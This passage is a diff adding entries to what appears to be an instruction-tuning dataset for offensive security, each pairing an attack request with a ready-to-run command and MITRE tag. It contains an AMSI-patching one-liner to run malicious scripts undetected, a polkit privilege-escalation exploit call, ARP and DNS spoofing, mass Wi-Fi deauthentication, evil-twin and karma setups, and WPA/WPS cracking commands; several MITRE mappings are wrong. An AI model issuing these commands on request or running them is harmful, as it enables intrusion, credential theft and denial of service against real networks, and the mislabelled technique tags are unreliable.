+    "output": "Command: gcloud storage buckets list --filter='publicAccessPrevention=inactive'\nAnalysis: Finds publicly accessible Google Cloud Storage (GCS) buckets.",
+    "category": "Cloud",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1530 - Cloud Infrastructure Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "gcloud"
+  },
+  {
+    "instruction": "Bypass Windows Defender using AMSI patching",
+    "input": "Target: Windows machine",
+    "output": "Command: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nAnalysis: Disables AMSI scanning in PowerShell to run malicious scripts undetected.",
+    "category": "Evasion",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1562.001 - Disable or Modify Tools",
+    "scenario_type": "RealWorld",
+    "tool_used": "PowerShell"
+  },
+  {
+    "instruction": "Gain root access via polkit pkexec vulnerability",
+    "input": "Target: Linux with polkit < 0.120",
+    "output": "Command: ./polkit-exploit\nAnalysis: Exploits CVE-2021-4034 to gain root privileges on Linux.",
+    "category": "Privilege Escalation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+    "scenario_type": "RealWorld",
+    "tool_used": "polkit-exploit"
+  },
+  {
+    "instruction": "Find social media accounts of a target",
+    "input": "Target: username johndoe",
+    "output": "Command: sherlock johndoe\nAnalysis: Searches for the username across multiple social media platforms and websites.",
+    "category": "OSINT",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1589.001 - Gather Victim Identity Information",
+    "scenario_type": "RealWorld",
+    "tool_used": "sherlock"
+  },
+  {
+    "instruction": "Crack WPA2 password hash",
+    "input": "Target: captured.hccapx",
+    "output": "Command: hashcat -m 22000 -a 0 captured.hccapx /usr/share/wordlists/rockyou.txt\nAnalysis: Attempts to crack WPA2 handshake using dictionary attack.",
+    "category": "Password Cracking",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1110.001 - Password Guessing",
+    "scenario_type": "RealWorld",
+    "tool_used": "hashcat"
+  },
+  {
+    "instruction": "Put wireless interface in monitor mode",
+    "input": "Target: wlan0 interface",
+    "output": "Command: airmon-ng start wlan0\nAnalysis: Enables monitor mode on wireless interface for packet capture.",
+    "category": "Wireless",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "airmon-ng"
+  },
+  {
+    "instruction": "Capture WPA handshake",
+    "input": "Target: WiFi network SSID",
+    "output": "Command: airodump-ng -c 1 --bssid [MAC] -w capture wlan0mon\nAnalysis: Monitors wireless traffic to capture WPA handshake for cracking.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "airodump-ng"
+  },
+  {
+    "instruction": "Convert PCAP to hashcat format",
+    "input": "Target: captured.pcap",
+    "output": "Command: hcxpcapngtool -o hash.hc22000 captured.pcap\nAnalysis: Converts captured packets to format suitable for hashcat cracking.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1003 - Credential Dumping",
+    "scenario_type": "RealWorld",
+    "tool_used": "hcxtools"
+  },
+  {
+    "instruction": "Identifying hashed file algorithm and mode",
+    "input": "Target: hashed file",
+    "output": "Command: hashcat --identify <hashed_file>\nAnalysis: Identifies the type of hashing algorithm used in the file.",
+    "category": "Password Cracking",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1003 - Credential Dumping",
+    "scenario_type": "RealWorld",
+    "tool_used": "hashcat"
+  },
+  {
+    "instruction": "Perform ARP spoofing attack",
+    "input": "Target: 192.168.1.100",
+    "output": "Command: bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.100; arp.spoof on'\nAnalysis: Initiates ARP spoofing to intercept network traffic.",
+    "category": "Network",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1557.002 - ARP Cache Poisoning",
+    "scenario_type": "RealWorld",
+    "tool_used": "bettercap"
+  },
+  {
+    "instruction": "Crack MD5 hash",
+    "input": "Target: 5f4dcc3b5aa765d61d8327deb882cf99",
+    "output": "Command: hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\nAnalysis: Attempts to crack MD5 hash using dictionary attack.",
+    "category": "Password Cracking",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1110.001 - Password Guessing",
+    "scenario_type": "RealWorld",
+    "tool_used": "hashcat"
+  },
+  {
+    "instruction": "Deauth attack on wireless network",
+    "input": "Target: WiFi network MAC address",
+    "output": "Command: aireplay-ng --deauth 10 -a [MAC] wlan0mon\nAnalysis: Sends deauthentication packets to force clients to reconnect.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "aireplay-ng"
+  },
+  {
+    "instruction": "Capture PMKID without client",
+    "input": "Target: WPA/WPA2 network",
+    "output": "Command: hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1\nAnalysis: Captures PMKID hash without requiring client connection.",
+    "category": "Wireless",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "hcxdumptool"
+  },
+  {
+    "instruction": "DNS spoofing with Bettercap",
+    "input": "Target: Local network",
+    "output": "Command: bettercap -iface eth0 -eval 'set dns.spoof.domains example.com; dns.spoof on'\nAnalysis: Redirects DNS queries to attacker-controlled IP.",
+    "category": "Network",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1557.002 - DNS Poisoning",
+    "scenario_type": "RealWorld",
+    "tool_used": "bettercap"
+  },
+  {
+    "instruction": "Evil Twin Attack setup",
+    "input": "Target: WiFi SSID 'CorporateWiFi'",
+    "output": "Command: airbase-ng -a AA:BB:CC:DD:EE:FF -e 'CorporateWiFi' -c 6 wlan0mon\nAnalysis: Creates a fake access point with same SSID to capture credentials.",
+    "category": "Wireless",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "airbase-ng"
+  },
+  {
+    "instruction": "Mass deauthentication attack on all clients",
+    "input": "Target: WiFi network on channel 6",
+    "output": "Command: aireplay-ng --deauth 0 -a [AP_MAC] wlan0mon\nAnalysis: Continuously sends deauth packets to all clients, causing DoS condition.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "aireplay-ng"
+  },
+  {
+    "instruction": "Targeted client deauthentication",
+    "input": "Target: Specific client MAC [CLIENT_MAC] on AP [AP_MAC]",
+    "output": "Command: aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon\nAnalysis: Deauthenticates specific client from network to capture handshake.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "aireplay-ng"
+  },
+  {
+    "instruction": "Scan for WPS enabled networks",
+    "input": "Target: All nearby WiFi networks",
+    "output": "Command: wash -i wlan0mon\nAnalysis: Identifies networks with WPS enabled for potential PIN attacks.",
+    "category": "Wireless",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "wash"
+  },
+  {
+    "instruction": "Crack WPS PIN using Reaver",
+    "input": "Target: WPS enabled AP [BSSID]",
+    "output": "Command: reaver -i wlan0mon -b [BSSID] -vv\nAnalysis: Attempts to brute force WPS PIN to gain network access.",
+    "category": "Wireless",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1110.001 - Password Guessing",
+    "scenario_type": "RealWorld",
+    "tool_used": "reaver"
+  },
+  {
+    "instruction": "Capture PMKID from multiple networks",
+    "input": "Target: All nearby WPA/WPA2 networks",
+    "output": "Command: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 --filterlist_ap=targets.txt --filtermode=2\nAnalysis: Captures PMKID from multiple specified access points simultaneously.",
+    "category": "Wireless",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "hcxdumptool"
+  },
+  {
+    "instruction": "Convert multiple handshake formats",
+    "input": "Target: captured.cap file",
+    "output": "Command: hcxpcapngtool -o hash.22000 -E essidlist captured.cap\nAnalysis: Converts captured handshakes to hashcat format while extracting network names.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1003 - Credential Dumping",
+    "scenario_type": "RealWorld",
+    "tool_used": "hcxtools"
+  },
+  {
+    "instruction": "Wireless network hidden SSID discovery",
+    "input": "Target: Hidden SSID network",
+    "output": "Command: airodump-ng -c 6 --bssid [AP_MAC] -w hidden_ssid wlan0mon\nAnalysis: Captures packets to reveal hidden network name when client connects.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "airodump-ng"
+  },
+  {
+    "instruction": "Fake authentication attack",
+    "input": "Target: WEP network [BSSID]",
+    "output": "Command: aireplay-ng --fakeauth 0 -a [BSSID] -h [YOUR_MAC] wlan0mon\nAnalysis: Performs fake authentication to associate with WEP network.",
+    "category": "Wireless",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "aireplay-ng"
+  },
+  {
+    "instruction": "Karma attack with Bettercap",
+    "input": "Target: Nearby client devices",
+    "output": "Command: bettercap -iface wlan0mon -eval 'set wifi.ap.ssid FreeWiFi; wifi.ap on; set wifi.ap.encryption false; wifi.recon on'\nAnalysis: Creates evil twin for any SSID requested by nearby clients.",
+    "category": "Wireless",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "bettercap"
+  }
+]
